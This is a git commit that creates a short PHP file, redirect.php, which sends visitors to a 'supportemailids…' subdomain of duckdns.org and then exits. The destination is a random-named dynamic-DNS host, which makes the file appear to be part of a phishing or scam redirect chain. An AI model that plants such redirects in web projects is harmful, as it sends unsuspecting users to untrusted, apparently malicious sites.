276253cdb3abba717109101d3ae1c8e365cb6751
toysantoy <67867524+toysantoy@users.noreply.github.com>
2021-10-08 17:32:56 +0700

    Create redirect.php

---
+++ redirect.php
@@ -0,0 +1,7 @@
+<?php
+/* Redirect browser */
+header("Location: https://supportemailids71623565s621.duckdns.org/?xcat");
+ 
+/* Make sure that code below does not get executed when we redirect. */
+exit;
+?>
